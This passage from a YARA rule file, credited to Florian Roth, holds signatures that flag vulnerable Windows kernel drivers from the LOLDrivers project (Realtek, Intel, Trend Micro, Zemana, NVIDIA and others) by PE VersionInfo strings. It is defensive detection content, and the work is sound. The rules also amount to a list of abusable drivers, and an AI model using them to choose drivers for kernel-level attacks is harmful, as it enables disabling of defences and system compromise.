https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300038002e0030003800320033002e0032003000310037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300038002e0030003800320033002e0032003000310037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f00770038007800360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f00200044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f00770038007800360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100370020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_1493_RID369A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nscm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:02:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c002000580054006900650072002000530065007300730069006f006e0020004d0061006e0061006700650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e0036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e0036 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00730063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000300038002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Powertool_Kevpsys_Powertool_7C0F_RID395D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - kEvP64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 19:00:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0050006f0077006500720054006f006f006c } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0050006f0077006500720054006f006f006c } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0031002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006b00450076005000360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0050006f0077006500720054006f006f006c } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006b00450076005000360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0050006f0077006500720054006f006f006c } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2900KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_D1F4_RID3E17 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iQVW64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:22:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300033002e0031002e00320020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300033002e0031002e0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300031003500200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cn_Computerzsys_BC45_RID344A : CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:24:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]003300360030002e0063006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310034002e0031003000320031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310034002e0031003000320031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100340020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_7CB4_RID3E18 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iQVW64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:22:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0033002e0032002e003100380020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0033002e0032002e00310038 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300031003900200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Safenetinc_Hostnt_Hostnt_07B6_RID37C1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HOSTNT.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:52:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0048006f00730074006e0074002000360034002d0062006900740020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053006100660065004e00650074002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0034002c00200030002c002000310036002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0034002c00200030002c002000310036002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0048006f00730074006e0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0048006f00730074006e0074 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0048006f00730074006e0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000200053006100660065004e00650074002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Rivetnetworksllc_Kfecodrvsys_Killertrafficcontrol_9A91_RID425E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - KfeCo11X64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:24:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004b0069006c006c006500720020005400720061006600660069006300200043006f006e00740072006f006c002000430061006c006c006f007500740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200690076006500740020004e006500740077006f0072006b0073002c0020004c004c0043002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0039002e0038002e0034002e00350039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0039002e0038002e0034002e00350039 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004b006600650043006f004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004b0069006c006c006500720020005400720061006600660069006300200043006f006e00740072006f006c } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004b006600650043006f004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310035002d00320030003100380020005200690076006500740020004e006500740077006f0072006b0073002c0020004c004c0043002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_848B_RID4215 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:12:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560049004400490041002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056004900440049004100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00300035002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00300035002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560049004400490041002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_7CB5_RID333C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:39:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0030002e0030002e003000300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0030002e0030002e003000300030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Asrockincorporation_Asrautochkupddrvsys_Asrautochkupddrvdriver_2AA1_RID47F0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AsrAutoChkUpdDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:22:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100730072004100750074006f00430068006b0055007000640044007200760020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100530052006f0063006b00200049006e0063006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300030002e00300030002e00300030003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300030002e00300030002e0030003000300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004100730072004100750074006f00430068006b005500700064004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100730072004100750074006f00430068006b0055007000640044007200760020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004100730072004100750074006f00430068006b005500700064004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100320020004100530052006f0063006b00200049006e0063006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_97B3_RID3DB1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:05:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00350030002e0030002e0031003000370030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00350030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000320020002d002000320030003100320020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Sisoftware_Sandra_Sisoftwaresandra_0EAB_RID3BFA : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sandra.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:52:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530061006e0064007200610020004400650076006900630065002000440072006900760065007200200028007800360034002900280055006e00690063006f006400650029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300690053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310035002e00310038002e0031002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310035002e00310038002e0031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300690053006f006600740077006100720065002000530061006e006400720061 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020005300690053006f0066007400770061007200650020004c0074006400200031003900390035002d00500072006500730065006e0074002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiosys_Realtekiodriver_8EF5_RID3B36 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:19:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300032002e0030003100310036002e00320030003100350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300032002e0030003100310036002e0032003000310035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f0044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100350020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_1F15_RID3BB2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:40:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f00770073002000780036003400200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200031002c00200036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003900200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Insydesoftwarecorp_Segwindrvxsys_Segwindowsdriverx_0452_RID42F6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - segwindrvx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:50:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005300450047002000570069006e0064006f0077007300200044007200690076006500720020007800360034 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]003100300030002c00200030002c00200030002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]003100300030002c00200030002c00200030002c00200031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730065006700770069006e006400720076007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300450047002000570069006e0064006f0077007300200044007200690076006500720020007800360034 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730065006700770069006e006400720076007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003100320020002d00200032003000310033002c00200049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_818E_RID3DB2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:05:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e00330030002e0030002e0031003000370038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100370020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_6FFD_RID3DD2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:10:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC 